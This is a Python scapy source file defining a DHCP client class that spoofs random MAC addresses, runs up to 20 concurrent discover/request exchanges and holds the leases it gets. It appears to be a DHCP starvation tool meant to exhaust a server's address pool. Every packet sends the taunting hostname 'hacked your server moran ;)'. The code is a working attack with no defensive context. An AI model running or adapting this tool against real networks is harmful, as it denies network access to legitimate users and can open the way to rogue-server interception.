from scapy.all import sniff,UDP,DHCP,BOOTP,IP,Ether,RandInt,RandMAC,srp1,sendp,DHCPRevOptions
from scapy.utils import mac2str
import random
from threading import Thread,get_ident 
import time 
from enum import Enum


class DHCPStatus(Enum):
    DISCOVER=0
    REQUEST=1
    MANTAIN0 = 2
    MANTAIN50=3
    MANTAIN87=4
    RECYCLE = 5
    
    
class DHCPClient:
	aborted = -1 
	__onAir__=0  #mini lock to prevent more then 10 at a time 
	__count__=0	
	__dstPort__ = 67 
	__srcPort__ = 68 
	__BROADCASTMAC__ = "ff:ff:ff:ff:ff:ff"
	__BROADCASTIP__ = "255.255.255.255"
	__DEFAULTIP__="0.0.0.0"
 
	def reset():
		DHCPClient.aborted = -1 
		DHCPClient.__onAir__=0  #mini lock to prevent more then 10 at a time 
 
	def __init__(self , iface : str  = None  , target : str = None ) : 
		self.mac = str(RandMAC())
		self.ip = DHCPClient.__DEFAULTIP__
		self.stat = DHCPStatus.DISCOVER
		self.mantian = False
		DHCPClient.__count__+=1
		self.time=None 
		self.curTime = None
		self.name = DHCPClient.__count__ 
		self.__server__ = {
			"mac" : None,  
			"ip" : None 
		}
		if not iface : 
			iface = "eth0"
		self.__settings__ = { 
        "serverIp" :   target , 
        "interface" : iface               
        }

	def to_trash(self):
		self.ip = DHCPClient.__DEFAULTIP__
		self.time = None 
		self.curTime = None 
		self.stat =DHCPStatus.DISCOVER
		self.mantian = True
		return self.discover()

	def re_requestyou(self):
		Frame = Ether(src = self.mac , dst = self.__server__["mac"] ) 
		Datagram =IP(src = self.ip , dst = self.__server__["ip"] )
		Segment=UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp= BOOTP( chaddr=mac2str(self.mac) , xid = RandInt())
		DHCPPACK =DHCP(options = [
		('message-type','request'),
		('hostname','hacked your server moran ;)IDHM;) '),
		('requested_addr', self.ip),
		'end'])
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
		ack = srp1(pack,iface=self.__settings__["interface"])
		if ack : 
				self.stat =  DHCPStatus(self.stat.value+1)
				self.curTime = time.time()
  
	def __requestyou__(self,packet)->None:
		self.stat = DHCPStatus.REQUEST
		print(f"req:  {packet.summary()} " )
		self.__server__["mac"] = packet[Ether].src
		self.__server__["ip"] = packet[IP].src 
		self.ip  = packet["IP"].dst
		print(f"IP : {self.ip }, name : {self.name}  ,thread :  {get_ident()}")
		Frame = Ether(src = self.mac , dst = self.__server__["mac"] ) 
		Datagram =IP(src = self.ip , dst = self.__server__["ip"] )
		Segment=UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp= BOOTP( chaddr=mac2str(self.mac) , xid = RandInt())
		DHCPPACK =DHCP(options = [
		('message-type','request'),
		('hostname','hacked your server moran ;)IDHM;) '),
		('requested_addr', self.ip),
		'end'])
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
		print("sending")
		ack = srp1(pack,iface=self.__settings__["interface"],verbose=False)
		optionsAck = ack[DHCP].options 
		for i in optionsAck : 
			if i[0] == "lease_time":
				self.time  = i[1]
				self.curTime = time.time()
				self.stat = DHCPStatus.MANTAIN0
				self.mantian = False 
				break 
		print(f"ack {self.name }  : {self.time}/ { ack.summary()}") 
		DHCPClient.__onAir__-=1
  
	def __offerme__(self)->None:
		pack = sniff(lfilter= lambda packet :
		Ether in packet 
		and packet[Ether].dst == self.mac 
		and  UDP in packet 
		and packet["UDP"].dport  == 68 
		and ( IP in packet and packet[IP].src == self.__settings__["serverIp"] if self.__settings__["serverIp"] else True  )
  
  			,
          	prn=self.__requestyou__,
          	count=1,timeout= 5 ) 
		print(f" pack : { self.name } : {pack } : { len(pack)}  ")
		if  len(pack) ==0   : 
			print(f"anonded {self.name}" ) 
			DHCPClient.aborted = self.name
		print(f"offerd ended : {self.name}") 

	def discover(self)-> Thread:  
		'''Discovers DHCP servers and starts connection process with them  '''
		while(DHCPClient.__onAir__ >= 20 and not self.mantian):
			if(DHCPClient.aborted != -1 ) :
				return None
		DHCPClient.__onAir__+=1 
		Frame = Ether(dst = DHCPClient.__BROADCASTMAC__, src = self.mac) 
		Datagram = IP( dst = DHCPClient.__BROADCASTIP__, src= self.ip  ) 
		Segment = UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp = BOOTP(chaddr=mac2str(self.mac) , xid = RandInt()) 
		DHCPPACK = DHCP ( options = [('message-type','discover'),('hostname','hacked your server moran ;)IDHM;) '),'end'] )
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
		tr = Thread(target=self.__offerme__)
		tr.start()
		sendp(pack,iface=self.__settings__["interface"],verbose=False)
		return tr 
		
	def valid(self):
		return self.ip != DHCPClient.__DEFAULTIP__ or self.mantian
